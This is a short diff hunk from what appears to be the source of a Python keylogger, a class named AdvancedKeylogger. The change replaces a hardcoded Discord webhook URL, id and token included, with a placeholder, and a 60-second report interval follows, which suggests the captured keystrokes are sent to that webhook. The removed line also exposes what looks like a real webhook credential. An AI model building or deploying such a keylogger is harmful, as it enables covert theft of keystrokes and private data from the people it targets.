@@ -250,7 +250,7 @@ class AdvancedKeylogger:
 
 if __name__ == "__main__":
     # Replace with your actual webhook URL
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1357049507598176408/EbqbNYUE1t2wVEO79Sd-4C1vUbP1pMdyXzMjvvMf2yD1qPCK8bCseHgRZb8j7qNQc21K"
+    WEBHOOK_URL = "Your webhook url here"
     
     # Configuration options
     REPORT_INTERVAL = 60  # seconds
